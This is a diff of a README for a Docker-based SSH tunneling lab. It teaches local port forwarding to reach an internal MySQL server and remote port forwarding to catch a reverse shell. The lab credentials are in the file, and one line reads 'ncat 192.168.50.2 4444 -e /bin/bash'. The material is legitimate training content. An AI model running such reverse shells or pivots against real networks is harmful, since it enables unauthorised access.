@@ -4,40 +4,42 @@
 
 ## Introduction
 
-| Repo |⭐ Please give a [Star](http://www.github.com/rootandbeer/ssh-tunneling-lab) if you enjoyed this lab ⭐ |
+| Repo | ⭐ Please give a [Star](https://github.com/rootandbeer/ssh-tunneling-lab) if you enjoyed this lab ⭐ |
 | --- | --- |
-| Downloads | [![GitHub Clones](https://img.shields.io/badge/dynamic/json?color=success&label=Clone&query=count&url=https://gist.githubusercontent.com/rootandbeer/b7ba3d389cc20606bb343135cbe3b7e7/raw/clone.json&logo=github)](https://github.com/MShawon/github-clone-count-badge) |
-| Stars | ![GitHub Repo stars](https://img.shields.io/github/stars/rootandbeer/ssh-tunneling-lab) |
-| Prerequisites | [Docker-ce](https://www.kali.org/docs/containers/installing-docker-on-kali/), mysql-client | 
-|Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |
+| Downloads | ![GitHub Clones](https://img.shields.io/badge/dynamic/json?color=success&label=Clone&query=count&url=https://gist.githubusercontent.com/rootandbeer/c0673910d3946ec90839257342efcc76/raw/clone.json&logo=github) |
+| Stars | ![GitHub Repo stars](https://img.shields.io/github/stars/rootandbeer/ssh-tunneling-lab?style=flat&labelColor=grey&color=blue&logo=github) |
+| Prerequisites | [Docker-ce](https://www.kali.org/docs/containers/installing-docker-on-kali/), SSH client, [mysql-client](https://dev.mysql.com/doc/refman/8.0/en/mysql.html) (for Objective 1) |
+| Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |
 
-This lab simulates a pentest pivot: you have SSH access to a jump host that can reach an internal server. In a real engagement, **only the pivot** can reach the internal server (192.168.50.10); you reach it by pivoting through the jump host. You will:
-
-1. **Objective 1:** Use **local port forwarding (-L)** to reach the internal MySQL server through the pivot.
-2. **Objective 2:** Use **remote port forwarding (-R)** to receive a reverse shell from the internal server through the pivot.
+This lab demonstrates SSH tunneling and pivoting. You have SSH access to a jump host (pivot) that can reach an internal server; in a real engagement, only the pivot would have that access. You will use **local port forwarding (-L)** to reach the internal MySQL server through the pivot, and **remote port forwarding (-R)** to receive a reverse shell from the internal server through the pivot. For more on the concepts, see [SSH Tunneling](/docs/post-exploitation/tunneling/ssh/).
 
 ---
 
 ## Lab Environment
 
-| Role | External IP | Internal IP | Port | Credentials |
-|------|-------------|-------------|------|-------------|
-| Jump/Pivot Host | 172.26.0.10 | 192.168.50.2 | 22 | pivotuser:PivotPass123 |
-| Internal server) | — | 192.168.50.10 | 22, 3306 | internaluser:InternalPass123 (SSH), root:MySQLRootPass123 (MySQL) |
+| Description | Hostname | External IP | Internal IP | Port | Credentials |
+| --- | --- | --- | --- | --- | --- |
+| Jump / Pivot | pivot | 172.26.0.10 | 192.168.50.2 | 22 | pivotuser:PivotPass123 |
+| Internal server | internal | — | 192.168.50.10 | 22, 3306 | internaluser:InternalPass123 (SSH), root:MySQLRootPass123 (MySQL) |
 
 ---
 
 ## Setup
 
-Clone and start the environment:
+Clone the repository:
 
 ```shell
 git clone https://github.com/rootandbeer/ssh-tunneling-lab
 cd ssh-tunneling-lab
-docker compose up -d
 ```
 
 \
+Start the environment:
+
+```shell
+docker compose up -d
+```
+
 >[!warning] Wait for MySQL to be ready (about 30–60 seconds).
 
 ---
@@ -71,9 +73,9 @@ docker compose up -d
 >USE app;
 >SELECT * FROM credentials;
 >```
+>You should see the row with `FLAG{ssh_tunnel_mysql_pivot}`.
 
-You should see the row with `FLAG{ssh_tunnel_mysql_pivot}`.
-
+\
 **Summary:** Your host (`127.0.0.1:13306`) → SSH tunnel → pivot → `192.168.50.10:3306` (MySQL).
 
 ---
@@ -101,27 +103,30 @@ This uses 3 terminals:
 >```
 
 >[!warning] Terminal 3 – Reach the internal server 
->**only via the pivot** (do not SSH from your host directly to 192.168.50.10). SSH to the pivot, then from the pivot SSH to the internal server. From that session, run the reverse shell to the pivot’s internal IP.
+>First SSH into the pivot host
 >
 >```shell
 >ssh -p 22 pivotuser@172.26.0.10
 ># Password: PivotPass123
 >```
-
->[!important] Terminal 2 - From the pivot prompt:
+>
+>\
+>SSH to the internal server
 >
 >```shell
 >ssh internaluser@192.168.50.10
 ># Password: InternalPass123
 >```
 >
+>\
 >Once connected setup the reverse shell:
 >
 >```shell
 >ncat 192.168.50.2 4444 -e /bin/bash
 >```
 
-You should get a shell in the terminal where `nc -lvnp 9444` is running on your host.
+\
+You should get a shell in `terminal 1` where `nc -lvnp 9444` is running on your host.
 
 **Summary:** 192.168.50.10 → 192.168.50.2:4444 (pivot) → SSH tunnel → your host:9444.
 
@@ -129,12 +134,13 @@ You should get a shell in the terminal where `nc -lvnp 9444` is running on your 
 
 ## Cleanup
 
-From the repo directory:
+Stop and remove the Docker containers:
 
 ```shell
 docker compose down
 ```
 
+\
 To remove the MySQL data volume as well:
 
 ```shell
@@ -144,4 +150,4 @@ docker compose down -v
 ---
 
 \
-⭐ Please give a [Star](http://www.github.com/rootandbeer/ssh-tunneling-lab) if you enjoyed this lab ⭐
+⭐ Please give a [Star](https://github.com/rootandbeer/ssh-tunneling-lab) if you enjoyed this lab ⭐
